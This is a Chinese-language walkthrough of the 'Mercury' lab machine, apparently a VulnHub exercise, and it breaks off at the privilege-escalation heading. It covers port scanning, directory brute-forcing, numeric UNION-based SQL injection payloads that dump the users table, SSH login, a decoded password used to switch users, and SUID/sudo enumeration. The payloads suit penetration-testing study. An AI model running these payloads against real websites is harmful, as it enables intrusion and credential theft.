知道靶机ip为192.168.174.135

```
nmap -sT -sV -sC -O -p- --min-rate 10000 192.168.174.135 -oA /nmapscan/tcp
```

```
nmap -sU --min-rate 10000 -p- 192.168.174.135 -oA /nmapscan/udp
```

分别进行tcp和udp扫描

![image-20260526210844767](Mercury.assets/image-20260526210844767.png)

从tcp扫描中看到只有两个端口开放，分别是22和8080

先查看8080端口，url为http://192.168.174.135:8080

![image-20260526211119073](Mercury.assets/image-20260526211119073.png)

意思是“你好。本网站目前正处于开发中，请稍后再来查看。”

那就先进行目录爆破

```
gobuster dir -u "http://192.168.174.135:8080" -w "/usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt"
```

爆破后发现只有一个robots.txt

![image-20260526211637599](Mercury.assets/image-20260526211637599.png)

没有什么特别的，这种情况下可以随便编造url试试是否有反应

![image-20260526211729742](Mercury.assets/image-20260526211729742.png)

发现报错页面

注意到还有一个mercuryfacts/目录

![image-20260526211818994](Mercury.assets/image-20260526211818994.png)

进入后如下

- #### Seelist

![image-20260526211900081](Mercury.assets/image-20260526211900081.png)

感觉没什么特别的

- #### Load a fact

![image-20260526211941912](Mercury.assets/image-20260526211941912.png)

##### 看到id：1

又看到目录

![image-20260526212013869](Mercury.assets/image-20260526212013869.png)

瞬间觉得此处应该存在sql注入（这里是“数字型注入“，不是”字符型注入“）

![image-20260526213302216](Mercury.assets/image-20260526213302216.png)

进行注入

```
1 order by 1;--+
```

发现只有一列，那就不需要占位符

```
1 union select database();--+
```

数据库是'mercury'

```
1 union select table_name from information_schema.tables where table_schema='mercury';--+
```

![image-20260526214329401](Mercury.assets/image-20260526214329401.png)

看到有两个表，分别是'users','facts'

```
1 union select column_name from information_schema.columns where table_name='users';--+
```

![image-20260526214521492](Mercury.assets/image-20260526214521492.png)

三列，分别是'id','password','username'

```
1 union select concat(id,':',username,'=',password) from users;--+
```

![image-20260526215440563](Mercury.assets/image-20260526215440563.png)

感觉这个webmaster最可疑，先尝试ssh登录这个

![image-20260526215636613](Mercury.assets/image-20260526215636613.png)

第一个flag到手，接下来查看用户下另一个目录的信息

![image-20260526215729482](Mercury.assets/image-20260526215729482.png)

在notes.txt中看到两个用户信息，webmaster我们有，猜测linuxmaster是更高级的用户，有更多的信息

所以先进行base64解码

![image-20260526215915210](Mercury.assets/image-20260526215915210.png)

得到密码

```
su linuxmaster
```

提权成功

先进行信息收集

```
find / -perm -u=s -type f 2>/dev/null
```

![image-20260526220115107](Mercury.assets/image-20260526220115107.png)

```
id
uname -a
```

![image-20260526220205766](Mercury.assets/image-20260526220205766.png)

```
sudo -l
```

![image-20260526220256016](Mercury.assets/image-20260526220256016.png)

------

（有一种比较简单的方法，但不是这个靶机的重点，方法是SUID二进制文件提权 (利用 CVE-2021-4034)，）

![image-20260526220415336](Mercury.assets/image-20260526220415336.png)

------

### 提权

本靶机更注重这种方法